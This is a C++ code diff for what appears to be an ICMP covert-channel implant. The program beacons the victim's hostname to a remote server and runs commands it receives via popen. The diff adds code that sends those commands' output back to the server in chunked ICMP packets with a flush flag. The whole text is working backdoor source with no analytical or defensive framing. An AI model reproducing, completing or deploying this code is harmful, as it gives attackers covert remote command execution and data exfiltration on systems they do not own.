@@ -28,7 +28,7 @@ static buffer out_buf;
 static buffer in_buf;
 static std::mutex buffer_mutex;
 
-static std::string beacon_msg = "b";
+static std::string beacon_msg;
 
 static uint32_t id;
 
@@ -60,13 +60,13 @@ void handle_data()
   std::lock_guard<std::mutex> guard(buffer_mutex);
   std::string data{ (char *)in_buf.data.data(), in_buf.data.size() };
 
+  std::cout << "Received: " << data << "\n";
+
   std::string cmd = data.substr(0, data.find(' '));
   std::string arg = data.substr(data.find(' ') + 1);
 
-  std::puts(cmd.c_str());
-
   if (cmd == "run") {
-    std::puts("running cmd");
+    std::cout << "Running command: " << arg << "\n";
     FILE *f;
     if (!(f = popen(arg.c_str(), "r"))) {
       return;
@@ -83,13 +83,13 @@ void handle_data()
       if (nbytes == -1 && errno == EAGAIN) {
         continue;
       } else if (nbytes > 0) {
-        std::cout << "Read: " << nbytes << "\n";
-        std::printf("%.*s", (int)nbytes, buf);
-        // out_buf.data.insert(out_buf.data.end(), &buf[0], &buf[511]);
+        out_buf.data.insert(out_buf.data.end(), &buf[0], &buf[nbytes]);
       } else {
         break;
       }
     }
+
+    out_buf.ready = true;
 
     pclose(f);
   }
@@ -137,12 +137,14 @@ int main(int argc, char **argv)
   char hostname[256];
   gethostname(hostname, sizeof(hostname));
 
-  beacon_msg += hostname;
+  beacon_msg = hostname;
 
   setsockopt(sockfd, SOL_SOCKET, SO_BINDTODEVICE, opt, len);
 
-  uint8_t out[sizeof(icmphdr) + 64];
+  uint8_t out[sizeof(icmphdr) + 5 + 64];
   uint8_t in[1024];
+  uint8_t flush = 0x00;
+
   while (1) {
     std::memset(out, 0, sizeof(out));
     std::memset(in, 0, sizeof(in));
@@ -153,26 +155,36 @@ int main(int argc, char **argv)
     size_t packet_size = sizeof(icmphdr);
 
     if (id) {
-      std::memcpy(out + packet_size, &id, sizeof(id));
+      std::memcpy(&out[packet_size], &id, sizeof(id));
       packet_size += sizeof(id);
+      packet_size += sizeof(flush);
+
+      if (flush == 0x01) {
+        flush = 0x00;
+      }
 
       if (out_buf.ready && out_buf.pos < out_buf.data.size()) {
         std::lock_guard<std::mutex> guard(buffer_mutex);
-        size_t to_write = out_buf.data.size() > 64 ? 64 : out_buf.data.size();
-        std::memcpy(icmp + 1, out_buf.data.data(), to_write);
+        size_t to_write = (out_buf.data.size() - out_buf.pos) > 64 ? 64 : (out_buf.data.size() - out_buf.pos);
+        std::memcpy(&out[packet_size], out_buf.data.data() + out_buf.pos, to_write);
         out_buf.pos += to_write;
         packet_size += to_write;
+        flush = 0x00;
         if (out_buf.pos >= out_buf.data.size()) {
+          std::puts("Flushing data to server!");
           out_buf.data.clear();
           out_buf.pos = 0;
           out_buf.ready = false;
+          flush = 0x01;
         }
       } else {
-        std::memcpy(out + packet_size, beacon_msg.c_str(), beacon_msg.size());
+        std::memcpy(&out[packet_size], beacon_msg.c_str(), beacon_msg.size());
         packet_size += beacon_msg.size();
+        flush = 0x02;
       }
-    }
 
+      std::memcpy(&out[sizeof(icmphdr) + sizeof(id)], &flush, sizeof(flush));
+    }
 
     icmp->checksum = checksum((uint16_t *)icmp, packet_size);
     if (sendto(sockfd, icmp, packet_size, 0, (sockaddr *)&addr, sizeof(addr)) == -1) {
